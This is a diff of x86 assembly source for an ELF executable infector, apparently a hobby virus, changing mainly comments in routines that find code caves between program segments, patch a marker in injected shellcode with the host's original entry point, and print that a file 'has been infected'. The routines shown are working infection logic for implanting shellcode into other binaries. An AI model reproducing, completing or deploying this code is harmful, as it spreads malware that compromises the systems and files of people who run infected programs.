@@ -359,6 +359,8 @@ leaving_mark:
 	push eax
 	call copy_data
 
+	;; printing "$FILE has been infected"
+
 	push STDOUT
 	mov eax, [pivot_name]
 	push eax
@@ -515,6 +517,7 @@ copied:
 
 
 find_gap:	; void *find_gap(void *data, void *segment_Phdr, DWORD shellcode_size)
+
 	push ebp
 	mov ebp, esp
 	;saving used registers
@@ -522,22 +525,22 @@ find_gap:	; void *find_gap(void *data, void *segment_Phdr, DWORD shellcode_size)
 	push ecx
 	push edx
 
-method1:	; checking between-segments gaps ; this should work most of the time duo to in-file segments
+method1:	; checking between-segments gaps, this should work most of the time duo to in-file segments
 		; alignement
 	mov eax, [ebp + 0xc]		; our target segment header
 	mov ebx, [eax + p_offset]
-	add ebx, [eax + p_filesz] 	; we have a pointer to the end the executable segment in file
+	add ebx, [eax + p_filesz] 	; we have a pointer to the end of the executable segment in file
 
 	; now getting the offset of the next segment
 
-	add eax, Elf32_Phdr_size	; segment ++
+	add eax, Elf32_Phdr_size	; segment_Phdr ++
 	mov ecx, [eax + p_offset] 	; pointer to the start of the next segment in file
 
-	sub ecx, ebx			; ecx should have the gap size now
+	sub ecx, ebx			; calculating the gap size
 	cmp ecx, [ebp + 8]		; gap_size > shellcode_size ?
 	jl method2			; the shellcode won't fit in the gap
 
-	; gap = ebx = (segment_Phdr -> offset + segment_Phdr -> filesz) + memmory base
+	; gap = ebx = (segment_Phdr -> offset + segment_Phdr -> filesz)(ebx) + memorry base
 
 	add ebx, [ebp + 0x10]		; gap offset in file + memorry base = pointer to the gap in memorry
 	mov eax, ebx			; to return
@@ -561,7 +564,7 @@ parsing_data:
 	cmp ecx, edx			; i > seg_size ?
 	je no_gap
 
-	cmp byte[ebx + ecx], 0		; segment[i] == 0 ?
+	cmp byte[ebx + ecx], 0		; segment[i] == 0 ? ; TODO : use lodsb and rsi instead
 	jne check_and_reset
 	inc eax				; ++ gap_size
 	jmp parsing_data
@@ -573,10 +576,10 @@ check_and_reset:
 	sub ecx, eax			; i - current_size
 	add ebx, ecx			; segment + i - current_size
 	mov eax, ebx			; the value to return
-	jmp found_gap
+	jmp found_gap			; this was ret_gap, in case replacing it causes some error
 
 reset_counter:
-	xor eax, eax 			; current gap size = 0
+	xor eax, eax 			; gap_size = 0
 	jmp parsing_data
 
 no_gap:
@@ -607,7 +610,7 @@ ret_gap:
 
 
 
-patch_jump_point:	;bool patch_jump_point(char *shellcode, size_t size, DWORD marker, DWORD entry_point)
+patch_jump_point:	; bool patch_jump_point(char *shellcode, size_t size, DWORD marker, DWORD entry_point)
 	push ebp
 	mov ebp, esp
 	;storing used registers
@@ -618,12 +621,12 @@ patch_jump_point:	;bool patch_jump_point(char *shellcode, size_t size, DWORD mar
 	mov eax, [ebp + 0x14]	 	; shellcode
 	mov ecx, [ebp + 0x10]		; size
 	mov edx, [ebp + 0xc] 		; the marker which is 0x69696969 in this case
-	; the combo eax + ecx points at the last byte in the shellcode string (\0) but we need it to point 
+	; the combo eax + ecx points at the last byte in the shellcode ('\0') but we need it to point 
 	; at the last DWORD
-	; so -1 byte for the null byte and -3 to point at the last valid DWORD
+	; so -1 byte for '\0' and -3 to point at the last DWORD
 	sub ecx, 4
 
-marker_loop:	; will be searching from the end to start as that is where the marker is likely to be
+marker_loop:	; will be searching backwards from the end as that's where the marker is likely to be
 	cmp dword[eax + ecx], edx
 	je found_marker
 
@@ -636,13 +639,13 @@ no_mark_found:
 	push no_marker_len
 	call print
 	add esp, 0xc
-	mov eax, -1			; returns FALSE
+	mov eax, -1			; return FALSE
 	jmp ret_patch
 
 found_marker:
 	mov ebx, [ebp + 0x8]		; the original entry point
 	mov [eax + ecx], ebx 		; patching the shellcode return address
-	xor eax, eax 			; returns TRUE
+	xor eax, eax 			; return TRUE
 
 ret_patch:
 	;restoring saved register
@@ -799,14 +802,14 @@ get_file_size:	; size_t get_file_size(int fd);
 	; reserving space for stat structure in the stack
 	sub esp, stat_size
 
-	mov eax, 0x6c
+	mov eax, 0x6c			; sys_newfstat
 	mov ebx, [ebp + 0x8]
 	mov ecx, esp
 
 	int 0x80
 
 	mov eax, [ecx + st_size]
-	add esp, stat_size
+	add esp, stat_size		; remove the structure of the stack
 
 	test eax, eax
 	jns ret_size
